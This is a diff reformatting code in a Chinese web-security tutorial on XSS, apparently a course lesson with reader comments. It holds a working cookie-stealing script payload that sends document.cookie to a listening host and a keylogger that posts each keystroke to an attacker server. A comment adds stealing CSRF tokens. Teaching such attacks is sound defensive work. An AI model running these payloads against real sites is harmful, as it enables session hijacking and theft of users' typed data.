@@ -33,7 +33,10 @@ cookie在英文中的意思为甜品、饼干，不过这里盗取cookie可不�
 在之前的学习中，我们知道它可以让页面弹出一个警告框，但如果我们将这个payload改为如下：
 
 ```javascript
-<script>var pic=document.createElement("img");pic.src="http://127.0.0.1:2222/getCookie?"+escape(document.cookie)</script>
+<script>
+  var
+  pic=document.createElement("img");pic.src="http://127.0.0.1:2222/getCookie?"+escape(document.cookie)
+</script>
 ```
 
 这个payload会调用JavaScript创建一个Element对象，之后将这个对象的src设置为我们监听的地址端口，向这个地址用GET方式上传参数document.cookie，这样我们就能窃取到用户的cookie啦。
@@ -57,17 +60,17 @@ cookie在英文中的意思为甜品、饼干，不过这里盗取cookie可不�
 这段代码可以去调用远程地址中的JavaScript文件，使得keylogger.js中的代码被执行。这里的keylogger.js的内容为：
 
 ```javascript
-document.onkeypress = function(evt) {
-    evt = evt || window.event;
-    key = String.fromCharCode(evt.charCode);
-    if(key) {
-        var http = new XMLHttpRequest();
-        var param = encodeURI(key);
-        http.open("POST","http://192.168.3.193/keylogger.php",true);
-        http.setRequestHeader("Content-type","application/x-www-form-urlencoded");
-        http.send("key="+param);
-    }
-}
+document.onkeypress = function (evt) {
+  evt = evt || window.event;
+  key = String.fromCharCode(evt.charCode);
+  if (key) {
+    var http = new XMLHttpRequest();
+    var param = encodeURI(key);
+    http.open("POST", "http://192.168.3.193/keylogger.php", true);
+    http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+    http.send("key=" + param);
+  }
+};
 ```
 
 它创建了一个监听按键的事件，这个事件可以记录用户在当前页面按下的每一个键，并将接收到的按键通过POST方式上传到攻击者用来存储按键记录的服务器上。其中keylogger.php的代码为：
@@ -209,6 +212,6 @@ Q1：拿到cookie以后，可以直接访问，并不需要使用“用户名+�
        从这句话来看，好像还需要用“用户名+密码”登录。
 
 Q2：BeEF的Hooked Browsers界面上，192.168.3.102前面的几个“？”是什么意思？
-        乱码吗？ 还是有其他含义？
+乱码吗？ 还是有其他含义？
 Q3：本专栏所用的软件、脚本等内容，放在一个公共地方了吗？</p>2022-02-15</li><br/><li><span>DoHer4S</span> 👍（0） 💬（0）<p>XSS攻击还可以盗取CSRF TOKEN来进行CSRF攻击；</p>2022-02-14</li><br/>
 </ul>
